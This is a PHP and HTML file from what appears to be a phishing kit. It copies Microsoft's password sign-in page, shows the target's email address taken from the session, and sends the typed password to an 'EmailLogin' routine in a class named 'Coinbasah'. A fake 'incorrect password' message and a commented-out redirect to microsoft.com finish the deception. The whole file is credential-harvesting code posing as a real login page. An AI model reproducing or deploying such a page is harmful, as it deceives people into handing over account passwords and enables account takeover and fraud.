<?php
error_log(E_ALL);
session_start();
require "../../function/settings.php";
// if ($_SESSION['Status'] != 'Email') {
//     header('Location: https://www.microsoft.com/en-us/microsoft-365?rtc=1');
// }
$Result =  new Coinbasah();
$Result->updateLog();
if (isset($_POST['Continue'])) {
    if ($Result->EmailLogin($_POST) > 0) {
    } else {
    }
}

?>
<!DOCTYPE html>
<html dir="ltr" lang="EN-US">

<head>
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Sign in to your Microsoft account</title>
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <link rel="icon" type="image/x-icon" href="assets/images/email/mikocoks.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" href="assets/css/email/Ouf1esRqI.css">
    <style type="text/css">
    </style>
    <style type="text/css">
        body {
            display: none;
        }
    </style>
    <style type="text/css">
        body {
            display: block !important;
        }
    </style>
    <noscript>
        <style type="text/css">
            body {
                display: block !important;
            }
        </style>
    </noscript>
    <style type="text/css">
        .inner,
        .promoted-fed-cred-box,
        .sign-in-box,
        .new-session-popup-v2sso,
        .debug-details-banner,
        .vertical-split-content {
            min-width: 0;
        }
    </style>
    <style type="text/css">
        .inner,
        .promoted-fed-cred-box,
        .sign-in-box,
        .new-session-popup-v2sso,
        .debug-details-banner,
        .vertical-split-content {
            min-width: 0;
        }
    </style>
    <style type="text/css">
        .inner,
        .promoted-fed-cred-box,
        .sign-in-box,
        .new-session-popup-v2sso,
        .debug-details-banner,
        .vertical-split-content {
            min-width: 0;
        }
    </style>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            /* Prevent scrolling */
        }

        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.6);
            /* Semi-transparent background */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            /* Ensure it's on top */
        }

        #animationContainer {
            width: 50px;
        }

        #loadingText {
            margin-top: 20px;
            font-size: 14px;
            color: #333;
        }
    </style>
</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>

        <div data-bind="if: activeDialog">
        </div>
        <div class="login-paginated-page" data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.F,
            showFooterLinks: true,
            useWizardBehavior: svr.bd,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
            <!--  -->

            <!-- ko ifnot: useLayoutTemplates -->
            <!-- /ko -->

            <!-- ko if: useLayoutTemplates -->
            <!-- ko withProperties: { '$page': $parent } -->
            <!-- ko if: isLightboxTemplate() -->
            <div id="lightboxTemplateContainer"
                data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.cm }"
                class="provide-min-height">
                <!--  -->

                <div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.cN },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }">
                    <div class="background-image-holder" role="presentation"
                        data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                        <!-- ko if: smallImageUrl -->
                        <!-- /ko -->

                        <!-- ko if: backgroundImageUrl -->
                        <div id="backgroundImage"
                            data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }"
                            style="background-image: url('assets/images/email/background.svg')"
                            class="background-image ext-background-image">
                        </div>
                        <!-- ko if: useImageMask -->
                        <!-- /ko -->
                        <!-- /ko -->
                    </div>
                </div>

                <!-- ko if: svr.cR -->
                <!-- /ko -->

                <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
                <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
                    <!-- ko if: showHeader -->
                    <!-- /ko -->

                    <div class="template-section main-section">
                        <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
                            <div class="full-height"
                                data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }">
                                <!--  -->

                                <!-- ko withProperties: { '$content': $data } -->
                                <div class="flex-column">
                                    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder -->
                                    <!-- /ko -->

                                    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl -->
                                    <!-- /ko -->

                                    <form action="" method="POST">
                                        <div class="win-scroll">
                                            <div id="lightbox" 
                                                class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
                                                <div class="lightbox-cover"
                                                    data-bind="css: { 'disable-lightbox': svr.Cf &amp;&amp; showLightboxProgress() }">
                                                </div>
                                                <div>
                                                    <img class="logo" role="img"
                                                        pngsrc="assets/images/email/msf_logo.svg"
                                                        svgsrc="assets/images/email/mcsf_logo.svg"
                                                        data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
                                                        src="assets/images/email/mcsf_logo.svg" alt="Microsoft">
                                                </div>
                                                <div style="padding-top:30px; text-align:center;">
                                                    <img style="width: 200px;" role="img" src="assets/images/email/microsoftmail.png" alt="Microsoft">
                                                </div>
                                                <div role="main">
                                                    <!--  -->

                                                    <div class="">
                                                        <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.i) -->
                                                        <!-- /ko -->

                                                        <div class="pagination-view animate slide-in-next">
                                                            <div data-viewid="1" data-showfedcredbutton="true">
                                                                <!--  -->

                                                                <!-- ko if: svr.fAllowLoginTextCustomizations -->
                                                                <!-- /ko -->

                                                                <!-- ko ifnot: svr.fAllowLoginTextCustomizations -->
                                                                <div>
                                                                    <div>
                                                                        <div class="row title ext-title"
                                                                            id="loginHeader"
                                                                            data-bind="externalCss: { 'title': true }">
                                                                            <img role="presentation" data-bind="imgSrc"
                                                                                src="assets/images/email/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg">
                                                                            <span
                                                                                style="padding-bottom:5px;color: #1b1b1b; font-size: .9375rem; font-weight: normal; line-height: 24px;">
                                                                                <?= @$_SESSION['Email']; ?> </span>
                                                                            <div role="heading" aria-level="1"
                                                                                data-bind="text: title">Enter password
                                                                            </div>
                                                                            <!-- ko if: isSubtitleVisible -->
                                                                            <!-- /ko -->
                                                                        </div>

                                                                        <!-- ko if: headerDescription -->
                                                                        <!-- /ko -->
                                                                    </div>
                                                                </div>
                                                                <!-- /ko -->

                                                                <!-- ko if: pageDescription && !svr.Cp -->
                                                                <!-- /ko -->

                                                                <div class="row">
                                                                    <div role="alert" aria-live="assertive">
                                                                        <!-- ko if: usernameTextbox.error -->
                                                                        <!-- /ko -->
                                                                    </div>

                                                                    <div class="form-group col-md-24">
                                                                        <!-- ko if: prefillNames().length > 1 -->
                                                                        <!-- /ko -->

                                                                        <!-- ko ifnot: prefillNames().length > 1 -->
                                                                        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.aZ ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                                                            <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                                            <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

                                                                            <input type="password" name="password"
                                                                                id="i0116" maxlength="113"
                                                                                class="form-control ltr_override input ext-input text-box ext-text-box"
                                                                                aria-required="true"
                                                                                data-report-event="Signin_Email_Phone_Skype"
                                                                                data-report-trigger="click"
                                                                                data-report-value="Email_Phone_Skype_Entry"
                                                                                data-bind="
                    attr: { lang: svr.a1 ? null : 'en' },
                    externalCss: {
                        'input': true,
                        'text-box': true,
                        'has-error': usernameTextbox.error },
                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.Cp ? ' loginDescription usernameError' : ' usernameError'),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText" aria-label="Password" required
                                                                                aria-describedby="loginHeader usernameError"
                                                                                placeholder="Password" required>

                                                                            <!-- /ko -->
                                                                            <!-- /ko -->
                                                                            <!-- ko ifnot: usePlaceholderAttribute -->
                                                                            <!-- /ko -->
                                                                        </div>
                                                                        <?php if(isset($_SESSION['errorb'])){ ?>
                                                                        <div style=" margin-top:5px">
                                                                            <span
                                                                                style="color:red; font-size: small;">The
                                                                                password you entered is
                                                                                incorrect!</span>
                                                                        </div>
                                                                        <?php } ?>
                                                                        <!-- /ko -->
                                                                    </div>
                                                                </div>

                                                                <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }, externalCss: { 'password-reset-links-container': true }"
                                                                    class="position-buttons password-reset-links-container ext-password-reset-links-container">
                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">
                                                                                <!-- ko if: svr.AY && !svr.Aj && !svr.a3 -->
                                                                                <!-- ko if: svr.Al -->
                                                                                <!-- /ko -->

                                                                                <!-- ko ifnot: svr.Al -->
                                                                                <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.j || '#',
                            ariaLabel: svr.j ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }"><a href="#">Forgot password?</a>
                                                                                </div>
                                                                                <!-- /ko -->
                                                                                <!-- /ko -->

                                                                                <!-- ko ifnot: hideCantAccessYourAccount -->
                                                                                <!-- /ko -->

                                                                                <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.Am || isOfflineAccountVisible) -->
                                                                                <!-- /ko -->

                                                                                <!-- ko if: svr.Ba -->
                                                                                <!-- /ko -->

                                                                                <!-- ko ifnot: svr.Ba -->
                                                                                <!-- ko if: showCredPicker -->
                                                                                <!-- /ko -->
                                                                                <!-- /ko -->

                                                                                <!-- ko if: svr.av -->
                                                                                <!-- /ko -->
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!-- ko if: svr.cc -->
                                                                <!-- /ko -->

                                                                <div class="win-button-pin-bottom"
                                                                    data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
                                                                    <div class="row"
                                                                        data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                                        <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.F,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.F &amp;&amp; isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }">
                                                                            <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container"
                                                                                data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">

                                                                                <!-- ko if: isSecondaryButtonVisible -->
                                                                                <!-- /ko -->

                                                                                <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }"
                                                                                    class="inline-block button-item ext-button-item">
                                                                                    <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                                    <input type="submit" id="continue"
                                                                                        name="Continue"
                                                                                        class="win-button button_primary button ext-button primary ext-primary"
                                                                                        data-report-event="Signin_Submit"
                                                                                        data-report-trigger="click"
                                                                                        data-report-value="Submit"
                                                                                        data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Sign in">
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!-- ko if: tenantBranding.BoilerPlateText -->
                                                                <!-- /ko -->
                                                            </div>
                                    </form>
                                    <!-- /ko -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->

                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </div>
                            </div>
                        </div>
                        <!-- /ko -->
                        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
                        </div>
                        <!-- /ko -->
                    </div>

                    <!-- ko if: $page.showFedCredAndNewSession -->
                    <!-- ko ifnot: svr.fUsePromotedFedCredTypesArray -->
                    <!-- ko if: $page.showFedCredButtons -->
                    <!-- /ko -->
                    <!-- /ko -->

                    <!-- ko if: svr.fUsePromotedFedCredTypesArray -->
                    <!-- /ko -->

                    <!-- ko if: $page.newSession -->
                    <!-- /ko -->
                    <!-- /ko -->

                    <!-- ko if: $page.showDebugDetails -->
                    <!-- /ko -->
                </div>
            </div>
            <!-- /ko -->
        </div>
    </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }">
            <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
            <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links"
                data-bind="externalCss: { 'footer-links': true }">

                <!-- ko if: showFooter -->
                <!-- ko if: !hideTOU -->
                <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="#"
                    class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                <!-- /ko -->

                <!-- ko if: !hidePrivacy -->
                <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="#"
                    class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
                <!-- /ko -->

                <!-- ko if: impressumLink -->
                <!-- /ko -->

                <!-- ko if: a11yConformeLink -->
                <!-- /ko -->

                <!-- ko if: showIcpLicense -->
                <!-- /ko -->
                <!-- /ko -->

                <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information"
                    aria-expanded="false"
                    class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
            </div>
            <!-- /ko -->

            <!-- ko if: svr.cc && showLinks -->
            <!-- /ko -->
        </div>
    </div>
    <!-- /ko -->
    </div>
    <!-- /ko -->
    </div>
    <!-- /ko -->

    <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() -->
    <!-- /ko -->
    <!-- /ko -->
    <!-- /ko -->
    </div>
    <!-- /ko -->
    <!-- /ko -->

    <!-- ko if: svr.DT -->
    <!-- /ko -->
    </div>
</body>

</html>